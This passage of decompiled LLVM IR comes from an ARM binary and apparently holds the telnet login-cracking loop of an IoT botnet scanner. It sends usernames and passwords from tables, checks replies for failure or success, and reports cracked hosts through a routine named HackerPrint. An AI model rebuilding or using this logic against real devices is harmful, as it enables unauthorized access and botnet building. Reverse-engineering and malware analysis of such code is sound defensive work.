  store i8 1, i8* %v4_e7f0, align 1
  br label %dec_label_pc_f660

dec_label_pc_e7f8:                                ; preds = %dec_label_pc_e728
  store i32 %v2_e810, i32* @r4, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v2_e82c = load i32, i32* %v1_e650, align 4
  store i32 %v2_e82c, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_e83c = call i32 @__libc_fcntl(i32 %v2_e82c, i32 3)
  %v1_e844 = and i32 %v2_e83c, -2049
  store i32 %v1_e844, i32* %r3.global-to-local, align 4
  %v0_e848 = load i32, i32* @r4, align 4
  store i32 %v1_e844, i32* @r2, align 4
  %v2_e854 = call i32 @__libc_fcntl(i32 %v0_e848, i32 4)
  store i32 0, i32* %v1_e0b4, align 4
  %v2_e89c = add i32 %v2_e0ac, 20
  store i32 %v2_e89c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_e8a4 = inttoptr i32 %v2_e89c to i8*
  store i8 0, i8* %v3_e8a4, align 4
  %v0_e8a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_e8a8 = trunc i32 %v0_e8a8 to i8
  %v2_e8a8 = load i32, i32* %r2.global-to-local, align 4
  %v3_e8a8 = add i32 %v2_e8a8, 1
  %v4_e8a8 = inttoptr i32 %v3_e8a8 to i8*
  store i8 %v1_e8a8, i8* %v4_e8a8, align 1
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  %v2_e8c8 = add i32 %v2_e0a8, %v2_e8c4
  store i32 %v2_e8c8, i32* %r3.global-to-local, align 4
  %v1_e8cc = inttoptr i32 %v2_e8c8 to i32*
  %v2_e8cc = load i32, i32* %v1_e8cc, align 4
  store i32 %v2_e8cc, i32* %r3.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_e8dc = inttoptr i32 %v2_e8cc to i8*
  %v3_e8dc = call i32 @__GI_memset(i8* %v2_e8dc, i32 0)
  %v2_e8fc = add i32 %v2_e0ac, 8
  store i32 %v2_e8fc, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v3_e904 = inttoptr i32 %v2_e8fc to i8*
  store i8 2, i8* %v3_e904, align 4
  br label %dec_label_pc_f660

dec_label_pc_e90c:                                ; preds = %dec_label_pc_e638
  %v3_e910 = icmp eq i32 %v5_e710, -1
  store i32 %storemerge612, i32* %r3.global-to-local, align 4
  br i1 %v3_e910, label %dec_label_pc_e918, label %dec_label_pc_e990

dec_label_pc_e918:                                ; preds = %dec_label_pc_e90c
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v2_e930 = load i32, i32* %v1_e650, align 4
  store i32 %v2_e930, i32* %r3.global-to-local, align 4
  %v3_e938 = call i32 @sclose(i32 %v2_e930, i32 %v3_df6c, i32 %v3_e0a0)
  %v2_e958 = add i32 %v2_e0ac, 8
  %v3_e960 = inttoptr i32 %v2_e958 to i8*
  store i8 0, i8* %v3_e960, align 4
  store i32 %v2_e958, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_e988 = add i32 %v2_e0ac, 9
  %v4_e988 = inttoptr i32 %v3_e988 to i8*
  store i8 1, i8* %v4_e988, align 1
  br label %dec_label_pc_f660

dec_label_pc_e990:                                ; preds = %dec_label_pc_e90c
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0b0, i32* %r3.global-to-local, align 4
  %v2_e9b0 = load i32, i32* %v1_e0b4, align 4
  store i32 %v2_e9b0, i32* %r3.global-to-local, align 4
  %v1_e9b4 = add i32 %v2_e9b0, 6
  store i32 %v1_e9b4, i32* @r4, align 4
  %v2_e9bc = call i32 @__GI_time(i32* null)
  store i32 %v2_e9bc, i32* %r3.global-to-local, align 4
  %v0_e9c4 = load i32, i32* @r4, align 4
  %v3_e9c4 = icmp ult i32 %v0_e9c4, %v2_e9bc
  br i1 %v3_e9c4, label %dec_label_pc_e9cc, label %dec_label_pc_f660

dec_label_pc_e9cc:                                ; preds = %dec_label_pc_e990
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v2_e9e4 = load i32, i32* %v1_e650, align 4
  store i32 %v2_e9e4, i32* %r3.global-to-local, align 4
  %v3_e9ec = call i32 @sclose(i32 %v2_e9e4, i32 %v3_df6c, i32 %v3_e0a0)
  %v2_ea0c = add i32 %v2_e0ac, 8
  %v3_ea14 = inttoptr i32 %v2_ea0c to i8*
  store i8 0, i8* %v3_ea14, align 4
  store i32 %v2_ea0c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_ea3c = add i32 %v2_e0ac, 9
  %v4_ea3c = inttoptr i32 %v3_ea3c to i8*
  store i8 1, i8* %v4_ea3c, align 1
  br label %dec_label_pc_f660

dec_label_pc_ea44:                                ; preds = %dec_label_pc_e0f8
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v1_ea5c = inttoptr i32 %v2_e0ac to i32*
  %v2_ea5c = load i32, i32* %v1_ea5c, align 4
  store i32 %v2_ea5c, i32* %ip.global-to-local, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  %v2_ea7c = add i32 %v2_e0a8, %v2_e8c4
  store i32 %v2_ea7c, i32* %r3.global-to-local, align 4
  %v1_ea80 = inttoptr i32 %v2_ea7c to i32*
  %v2_ea80 = load i32, i32* %v1_ea80, align 4
  store i32 %v2_ea80, i32* %r2.global-to-local, align 4
  %v1_ea88 = load i32, i32* @sp, align 4
  %v2_ea88 = inttoptr i32 %v1_ea88 to i32*
  store i32 ptrtoint (i32* @global_var_2b154 to i32), i32* %v2_ea88, align 4
  %v0_ea8c = load i32, i32* %ip.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v4_ea98 = inttoptr i32 %v2_ea80 to i8*
  %v5_ea98 = call i32 @read_until_response(i32 %v0_ea8c, i32 10, i8* %v4_ea98, i32 1024)
  %v2_eaa0 = icmp eq i32 %v5_ea98, 0
  store i32 %storemerge612, i32* %r3.global-to-local, align 4
  br i1 %v2_eaa0, label %dec_label_pc_eb38, label %dec_label_pc_eaa8

dec_label_pc_eaa8:                                ; preds = %dec_label_pc_ea44
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_ea7c, i32* %r3.global-to-local, align 4
  %v2_eac8 = load i32, i32* %v1_ea80, align 4
  store i32 %v2_eac8, i32* %r3.global-to-local, align 4
  %v3_ead0 = call i32 @contains_fail(i32 %v2_eac8, i32 %v3_df6c, i32 %v3_e0a0)
  %v2_ead8 = icmp eq i32 %v3_ead0, 0
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v2_eb28 = add i32 %v2_e0ac, 8
  store i32 %v2_eb28, i32* %r2.global-to-local, align 4
  br i1 %v2_ead8, label %dec_label_pc_eb0c, label %dec_label_pc_eae0

dec_label_pc_eae0:                                ; preds = %dec_label_pc_eaa8
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_eb04 = inttoptr i32 %v2_eb28 to i8*
  store i8 0, i8* %v3_eb04, align 4
  br label %dec_label_pc_f660

dec_label_pc_eb0c:                                ; preds = %dec_label_pc_eaa8
  store i32 3, i32* %r3.global-to-local, align 4
  %v3_eb30 = inttoptr i32 %v2_eb28 to i8*
  store i8 3, i8* %v3_eb30, align 4
  br label %dec_label_pc_f660

dec_label_pc_eb38:                                ; preds = %dec_label_pc_ea44
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0b0, i32* %r3.global-to-local, align 4
  %v2_eb58 = load i32, i32* %v1_e0b4, align 4
  store i32 %v2_eb58, i32* %r3.global-to-local, align 4
  %v1_eb5c = add i32 %v2_eb58, 6
  store i32 %v1_eb5c, i32* @r4, align 4
  %v2_eb64 = call i32 @__GI_time(i32* null)
  store i32 %v2_eb64, i32* %r3.global-to-local, align 4
  %v0_eb6c = load i32, i32* @r4, align 4
  %v3_eb6c = icmp ult i32 %v0_eb6c, %v2_eb64
  br i1 %v3_eb6c, label %dec_label_pc_eb74, label %dec_label_pc_f660

dec_label_pc_eb74:                                ; preds = %dec_label_pc_eb38
  %v2_eb90 = add i32 %v2_e0ac, 8
  %v3_eb98 = inttoptr i32 %v2_eb90 to i8*
  store i8 0, i8* %v3_eb98, align 4
  store i32 %v2_eb90, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_ebc0 = add i32 %v2_e0ac, 9
  %v4_ebc0 = inttoptr i32 %v3_ebc0 to i8*
  store i8 1, i8* %v4_ebc0, align 1
  br label %dec_label_pc_f660

dec_label_pc_ebc8:                                ; preds = %dec_label_pc_e0f8
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v1_ebe0 = inttoptr i32 %v2_e0ac to i32*
  %v2_ebe0 = load i32, i32* %v1_ebe0, align 4
  store i32 %v2_ebe0, i32* @r4, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  %v2_ec00 = add i32 %v2_e0ac, 8
  store i32 %v2_ec00, i32* %r3.global-to-local, align 4
  %v1_ec04 = add i32 %v2_e0ac, 10
  %v2_ec04 = inttoptr i32 %v1_ec04 to i8*
  %v3_ec04 = load i8, i8* %v2_ec04, align 2
  %v4_ec04 = zext i8 %v3_ec04 to i32
  store i32 %v4_ec04, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([45 x i8*]* @global_var_2b0a0.522 to i32), i32* %r3.global-to-local, align 4
  %v4_ec10 = mul nuw nsw i32 %v4_ec04, 4
  %v5_ec10 = add i32 %v4_ec10, ptrtoint ([45 x i8*]* @global_var_2b0a0.522 to i32)
  %v6_ec10 = inttoptr i32 %v5_ec10 to i32*
  %v7_ec10 = load i32, i32* %v6_ec10, align 4
  store i32 %v7_ec10, i32* @r5, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_ec00, i32* %r3.global-to-local, align 4
  %v3_ec34 = load i8, i8* %v2_ec04, align 2
  %v4_ec34 = zext i8 %v3_ec34 to i32
  store i32 %v4_ec34, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([45 x i8*]* @global_var_2b0a0.522 to i32), i32* %r3.global-to-local, align 4
  %v4_ec40 = mul nuw nsw i32 %v4_ec34, 4
  %v5_ec40 = add i32 %v4_ec40, ptrtoint ([45 x i8*]* @global_var_2b0a0.522 to i32)
  %v6_ec40 = inttoptr i32 %v5_ec40 to i32*
  %v7_ec40 = load i32, i32* %v6_ec40, align 4
  store i32 %v7_ec40, i32* %r3.global-to-local, align 4
  %v1_ec44 = inttoptr i32 %v7_ec40 to i8*
  %v3_ec48 = call i32 @strlen(i8* %v1_ec44)
  %v0_ec50 = load i32, i32* @r4, align 4
  %v0_ec54 = load i32, i32* @r5, align 4
  store i32 %v3_ec48, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_ec60 = inttoptr i32 %v0_ec54 to i32*
  %v5_ec60 = call i32 @__libc_send(i32 %v0_ec50, i32* %v4_ec60, i32 %v3_ec48, i32 16384)
  %v1_ec68 = icmp slt i32 %v5_ec60, 0
  store i32 %storemerge612, i32* %r3.global-to-local, align 4
  br i1 %v1_ec68, label %dec_label_pc_ec70, label %dec_label_pc_ecc4

dec_label_pc_ec70:                                ; preds = %dec_label_pc_ebc8
  %v3_ec94 = inttoptr i32 %v2_ec00 to i8*
  store i8 0, i8* %v3_ec94, align 4
  store i32 %v2_ec00, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_ecbc = add i32 %v2_e0ac, 9
  %v4_ecbc = inttoptr i32 %v3_ecbc to i8*
  store i8 1, i8* %v4_ecbc, align 1
  br label %dec_label_pc_f660

dec_label_pc_ecc4:                                ; preds = %dec_label_pc_ebc8
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v2_ecdc = load i32, i32* %v1_ebe0, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_ecf0 = call i32 @__libc_send(i32 %v2_ecdc, i32* bitcast ([3 x i8]* @global_var_1de64.524 to i32*), i32 2, i32 16384)
  %v1_ecf8 = icmp slt i32 %v6_ecf0, 0
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  store i32 %v2_ec00, i32* %r2.global-to-local, align 4
  br i1 %v1_ecf8, label %dec_label_pc_ed00, label %dec_label_pc_ed54

dec_label_pc_ed00:                                ; preds = %dec_label_pc_ecc4
  %v3_ed24 = inttoptr i32 %v2_ec00 to i8*
  store i8 0, i8* %v3_ed24, align 4
  store i32 %v2_ec00, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_ed4c = add i32 %v2_e0ac, 9
  %v4_ed4c = inttoptr i32 %v3_ed4c to i8*
  store i8 1, i8* %v4_ed4c, align 1
  br label %dec_label_pc_f660

dec_label_pc_ed54:                                ; preds = %dec_label_pc_ecc4
  store i32 4, i32* %r3.global-to-local, align 4
  %v3_ed78 = inttoptr i32 %v2_ec00 to i8*
  store i8 4, i8* %v3_ed78, align 4
  br label %dec_label_pc_f660

dec_label_pc_ed80:                                ; preds = %dec_label_pc_e0f8
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v1_ed98 = inttoptr i32 %v2_e0ac to i32*
  %v2_ed98 = load i32, i32* %v1_ed98, align 4
  store i32 %v2_ed98, i32* %ip.global-to-local, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  %v2_edb8 = add i32 %v2_e0a8, %v2_e8c4
  store i32 %v2_edb8, i32* %r3.global-to-local, align 4
  %v1_edbc = inttoptr i32 %v2_edb8 to i32*
  %v2_edbc = load i32, i32* %v1_edbc, align 4
  store i32 %v2_edbc, i32* %r2.global-to-local, align 4
  %v1_edc4 = load i32, i32* @sp, align 4
  %v2_edc4 = inttoptr i32 %v1_edc4 to i32*
  store i32 ptrtoint (i32* @global_var_2b154 to i32), i32* %v2_edc4, align 4
  %v0_edc8 = load i32, i32* %ip.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v4_edd4 = inttoptr i32 %v2_edbc to i8*
  %v5_edd4 = call i32 @read_until_response(i32 %v0_edc8, i32 10, i8* %v4_edd4, i32 1024)
  %v2_eddc = icmp eq i32 %v5_edd4, 0
  store i32 %storemerge612, i32* %r3.global-to-local, align 4
  br i1 %v2_eddc, label %dec_label_pc_ee74, label %dec_label_pc_ede4

dec_label_pc_ede4:                                ; preds = %dec_label_pc_ed80
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_edb8, i32* %r3.global-to-local, align 4
  %v2_ee04 = load i32, i32* %v1_edbc, align 4
  store i32 %v2_ee04, i32* %r3.global-to-local, align 4
  %v3_ee0c = call i32 @contains_fail(i32 %v2_ee04, i32 %v3_df6c, i32 %v3_e0a0)
  %v2_ee14 = icmp eq i32 %v3_ee0c, 0
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v2_ee64 = add i32 %v2_e0ac, 8
  store i32 %v2_ee64, i32* %r2.global-to-local, align 4
  br i1 %v2_ee14, label %dec_label_pc_ee48, label %dec_label_pc_ee1c

dec_label_pc_ee1c:                                ; preds = %dec_label_pc_ede4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_ee40 = inttoptr i32 %v2_ee64 to i8*
  store i8 0, i8* %v3_ee40, align 4
  br label %dec_label_pc_f660

dec_label_pc_ee48:                                ; preds = %dec_label_pc_ede4
  store i32 5, i32* %r3.global-to-local, align 4
  %v3_ee6c = inttoptr i32 %v2_ee64 to i8*
  store i8 5, i8* %v3_ee6c, align 4
  br label %dec_label_pc_f660

dec_label_pc_ee74:                                ; preds = %dec_label_pc_ed80
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0b0, i32* %r3.global-to-local, align 4
  %v2_ee94 = load i32, i32* %v1_e0b4, align 4
  store i32 %v2_ee94, i32* %r3.global-to-local, align 4
  %v1_ee98 = add i32 %v2_ee94, 6
  store i32 %v1_ee98, i32* @r4, align 4
  %v2_eea0 = call i32 @__GI_time(i32* null)
  store i32 %v2_eea0, i32* %r3.global-to-local, align 4
  %v0_eea8 = load i32, i32* @r4, align 4
  %v3_eea8 = icmp ult i32 %v0_eea8, %v2_eea0
  br i1 %v3_eea8, label %dec_label_pc_eeb0, label %dec_label_pc_f660

dec_label_pc_eeb0:                                ; preds = %dec_label_pc_ee74
  %v2_eecc = add i32 %v2_e0ac, 8
  %v3_eed4 = inttoptr i32 %v2_eecc to i8*
  store i8 0, i8* %v3_eed4, align 4
  store i32 %v2_eecc, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_eefc = add i32 %v2_e0ac, 9
  %v4_eefc = inttoptr i32 %v3_eefc to i8*
  store i8 1, i8* %v4_eefc, align 1
  br label %dec_label_pc_f660

dec_label_pc_ef04:                                ; preds = %dec_label_pc_e0f8
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v1_ef1c = inttoptr i32 %v2_e0ac to i32*
  %v2_ef1c = load i32, i32* %v1_ef1c, align 4
  store i32 %v2_ef1c, i32* @r4, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  %v2_ef3c = add i32 %v2_e0ac, 8
  store i32 %v2_ef3c, i32* %r3.global-to-local, align 4
  %v1_ef40 = add i32 %v2_e0ac, 11
  %v2_ef40 = inttoptr i32 %v1_ef40 to i8*
  %v3_ef40 = load i8, i8* %v2_ef40, align 1
  %v4_ef40 = zext i8 %v3_ef40 to i32
  store i32 %v4_ef40, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([23 x i8*]* @global_var_2b0f8.526 to i32), i32* %r3.global-to-local, align 4
  %v4_ef4c = mul nuw nsw i32 %v4_ef40, 4
  %v5_ef4c = add i32 %v4_ef4c, ptrtoint ([23 x i8*]* @global_var_2b0f8.526 to i32)
  %v6_ef4c = inttoptr i32 %v5_ef4c to i32*
  %v7_ef4c = load i32, i32* %v6_ef4c, align 4
  store i32 %v7_ef4c, i32* @r5, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_ef3c, i32* %r3.global-to-local, align 4
  %v3_ef70 = load i8, i8* %v2_ef40, align 1
  %v4_ef70 = zext i8 %v3_ef70 to i32
  store i32 %v4_ef70, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([23 x i8*]* @global_var_2b0f8.526 to i32), i32* %r3.global-to-local, align 4
  %v4_ef7c = mul nuw nsw i32 %v4_ef70, 4
  %v5_ef7c = add i32 %v4_ef7c, ptrtoint ([23 x i8*]* @global_var_2b0f8.526 to i32)
  %v6_ef7c = inttoptr i32 %v5_ef7c to i32*
  %v7_ef7c = load i32, i32* %v6_ef7c, align 4
  store i32 %v7_ef7c, i32* %r3.global-to-local, align 4
  %v1_ef80 = inttoptr i32 %v7_ef7c to i8*
  %v3_ef84 = call i32 @strlen(i8* %v1_ef80)
  %v0_ef8c = load i32, i32* @r4, align 4
  %v0_ef90 = load i32, i32* @r5, align 4
  store i32 %v3_ef84, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_ef9c = inttoptr i32 %v0_ef90 to i32*
  %v5_ef9c = call i32 @__libc_send(i32 %v0_ef8c, i32* %v4_ef9c, i32 %v3_ef84, i32 16384)
  %v1_efa4 = icmp slt i32 %v5_ef9c, 0
  store i32 %storemerge612, i32* %r3.global-to-local, align 4
  br i1 %v1_efa4, label %dec_label_pc_efac, label %dec_label_pc_f000

dec_label_pc_efac:                                ; preds = %dec_label_pc_ef04
  %v3_efd0 = inttoptr i32 %v2_ef3c to i8*
  store i8 0, i8* %v3_efd0, align 4
  store i32 %v2_ef3c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_eff8 = add i32 %v2_e0ac, 9
  %v4_eff8 = inttoptr i32 %v3_eff8 to i8*
  store i8 1, i8* %v4_eff8, align 1
  br label %dec_label_pc_f660

dec_label_pc_f000:                                ; preds = %dec_label_pc_ef04
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v2_f018 = load i32, i32* %v1_ef1c, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_f02c = call i32 @__libc_send(i32 %v2_f018, i32* bitcast ([3 x i8]* @global_var_1de64.524 to i32*), i32 2, i32 16384)
  %v1_f034 = icmp slt i32 %v6_f02c, 0
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  store i32 %v2_ef3c, i32* %r2.global-to-local, align 4
  br i1 %v1_f034, label %dec_label_pc_f03c, label %dec_label_pc_f090

dec_label_pc_f03c:                                ; preds = %dec_label_pc_f000
  %v3_f060 = inttoptr i32 %v2_ef3c to i8*
  store i8 0, i8* %v3_f060, align 4
  store i32 %v2_ef3c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_f088 = add i32 %v2_e0ac, 9
  %v4_f088 = inttoptr i32 %v3_f088 to i8*
  store i8 1, i8* %v4_f088, align 1
  br label %dec_label_pc_f660

dec_label_pc_f090:                                ; preds = %dec_label_pc_f000
  store i32 6, i32* %r3.global-to-local, align 4
  %v3_f0b4 = inttoptr i32 %v2_ef3c to i8*
  store i8 6, i8* %v3_f0b4, align 4
  br label %dec_label_pc_f660

dec_label_pc_f0bc:                                ; preds = %dec_label_pc_e0f8
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v1_f0d4 = inttoptr i32 %v2_e0ac to i32*
  %v2_f0d4 = load i32, i32* %v1_f0d4, align 4
  store i32 %v2_f0d4, i32* %ip.global-to-local, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  %v2_f0f4 = add i32 %v2_e0a8, %v2_e8c4
  store i32 %v2_f0f4, i32* %r3.global-to-local, align 4
  %v1_f0f8 = inttoptr i32 %v2_f0f4 to i32*
  %v2_f0f8 = load i32, i32* %v1_f0f8, align 4
  store i32 %v2_f0f8, i32* %r2.global-to-local, align 4
  %v1_f100 = load i32, i32* @sp, align 4
  %v2_f100 = inttoptr i32 %v1_f100 to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_2b19c.528 to i32), i32* %v2_f100, align 4
  %v0_f104 = load i32, i32* %ip.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v4_f110 = inttoptr i32 %v2_f0f8 to i8*
  %v5_f110 = call i32 @read_until_response(i32 %v0_f104, i32 10, i8* %v4_f110, i32 1024)
  store i32 %v5_f110, i32* %r3.global-to-local, align 4
  %v2_f118 = icmp eq i32 %v5_f110, 0
  br i1 %v2_f118, label %dec_label_pc_f414, label %dec_label_pc_f120

dec_label_pc_f120:                                ; preds = %dec_label_pc_f0bc
  store i32 %storemerge612, i32* @r4, align 4
  %v2_f128 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_f13c = load i32, i32* @r4, align 4
  %v2_f148 = mul i32 %v0_f13c, 28
  %v2_f150 = add i32 %v2_f42c, %v2_f148
  %v2_f154 = inttoptr i32 %v2_f150 to i32*
  store i32 %v2_f128, i32* %v2_f154, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  %v2_f174 = add i32 %v2_e0ac, 24
  store i32 %v2_f174, i32* %r3.global-to-local, align 4
  %v1_f178 = inttoptr i32 %v2_f174 to i32*
  %v2_f178 = load i32, i32* %v1_f178, align 4
  store i32 %v2_f178, i32* %r3.global-to-local, align 4
  %v3_f180 = call i32 @contains_fail(i32 %v2_f178, i32 %v3_df6c, i32 %v3_e0a0)
  %v2_f188 = icmp eq i32 %v3_f180, 0
  store i32 %storemerge612, i32* %r3.global-to-local, align 4
  br i1 %v2_f188, label %dec_label_pc_f1bc, label %dec_label_pc_f190

dec_label_pc_f190:                                ; preds = %dec_label_pc_f120
  %v2_f1ac = add i32 %v2_e0ac, 8
  store i32 %v2_f1ac, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_f1b4 = inttoptr i32 %v2_f1ac to i8*
  store i8 0, i8* %v3_f1b4, align 4
  br label %dec_label_pc_f660

dec_label_pc_f1bc:                                ; preds = %dec_label_pc_f120
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_f174, i32* %r3.global-to-local, align 4
  %v2_f1dc = load i32, i32* %v1_f178, align 4
  store i32 %v2_f1dc, i32* %r3.global-to-local, align 4
  %v3_f1e4 = call i32 @contains_success(i32 %v2_f1dc, i32 %v3_df6c, i32 %v3_e0a0)
  %v2_f1ec = icmp eq i32 %v3_f1e4, 0
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v2_f3dc = add i32 %v2_e0ac, 8
  br i1 %v2_f1ec, label %dec_label_pc_f3c0, label %dec_label_pc_f1f4

dec_label_pc_f1f4:                                ; preds = %dec_label_pc_f1bc
  store i32 %v2_f3dc, i32* %r3.global-to-local, align 4
  %v1_f214 = add i32 %v2_e0ac, 9
  %v2_f214 = inttoptr i32 %v1_f214 to i8*
  %v3_f214 = load i8, i8* %v2_f214, align 1
  %v4_f214 = zext i8 %v3_f214 to i32
  store i32 %v4_f214, i32* %r3.global-to-local, align 4
  %v7_f218 = icmp eq i8 %v3_f214, 2
  br i1 %v7_f218, label %dec_label_pc_f220, label %dec_label_pc_f24c

dec_label_pc_f220:                                ; preds = %dec_label_pc_f1f4
  store i32 %v2_f3dc, i32* %r2.global-to-local, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v3_f244 = inttoptr i32 %v2_f3dc to i8*
  store i8 7, i8* %v3_f244, align 4
  br label %dec_label_pc_f660

dec_label_pc_f24c:                                ; preds = %dec_label_pc_f1f4
  %v2_f250 = load i32, i32* @global_var_2b5d0.55, align 4
  store i32 %v2_f250, i32* @r4, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v3_f270 = call i32 @get_telstate_host(i32 %v2_e0ac, i32 %v3_df6c, i32 %v3_e0a0)
  store i32 %v3_f270, i32* %ip.global-to-local, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_f3dc, i32* %r3.global-to-local, align 4
  %v1_f298 = add i32 %v2_e0ac, 10
  %v2_f298 = inttoptr i32 %v1_f298 to i8*
  %v3_f298 = load i8, i8* %v2_f298, align 2
  %v4_f298 = zext i8 %v3_f298 to i32
  store i32 %v4_f298, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([45 x i8*]* @global_var_2b0a0.522 to i32), i32* %r3.global-to-local, align 4
  %v4_f2a4 = mul nuw nsw i32 %v4_f298, 4
  %v5_f2a4 = add i32 %v4_f2a4, ptrtoint ([45 x i8*]* @global_var_2b0a0.522 to i32)
  %v6_f2a4 = inttoptr i32 %v5_f2a4 to i32*
  %v7_f2a4 = load i32, i32* %v6_f2a4, align 4
  store i32 %v7_f2a4, i32* @lr, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_f3dc, i32* %r3.global-to-local, align 4
  %v1_f2c8 = add i32 %v2_e0ac, 11
  %v2_f2c8 = inttoptr i32 %v1_f2c8 to i8*
  %v3_f2c8 = load i8, i8* %v2_f2c8, align 1
  %v4_f2c8 = zext i8 %v3_f2c8 to i32
  store i32 %v4_f2c8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([23 x i8*]* @global_var_2b0f8.526 to i32), i32* %r3.global-to-local, align 4
  %v4_f2d4 = mul nuw nsw i32 %v4_f2c8, 4
  %v5_f2d4 = add i32 %v4_f2d4, ptrtoint ([23 x i8*]* @global_var_2b0f8.526 to i32)
  %v6_f2d4 = inttoptr i32 %v5_f2d4 to i32*
  %v7_f2d4 = load i32, i32* %v6_f2d4, align 4
  %v1_f2d8 = load i32, i32* @sp, align 4
  %v2_f2d8 = inttoptr i32 %v1_f2d8 to i32*
  store i32 %v7_f2d4, i32* %v2_f2d8, align 4
  %v0_f2dc = load i32, i32* @r4, align 4
  %v0_f2e4 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_f2e4, i32* @r2, align 4
  %v0_f2e8 = load i32, i32* @lr, align 4
  store i32 %v0_f2e8, i32* %r3.global-to-local, align 4
  %v2_f2ec = call i32 @HackerPrint(i32 %v0_f2dc, i32 ptrtoint (i32* @global_var_1de68.531 to i32))
  %v2_f2f4 = load i32, i32* @global_var_2b5d0.55, align 4
  store i32 %v2_f2f4, i32* @r4, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v3_f314 = call i32 @get_telstate_host(i32 %v2_e0ac, i32 %v3_df6c, i32 %v3_e0a0)
  store i32 %v3_f314, i32* %ip.global-to-local, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
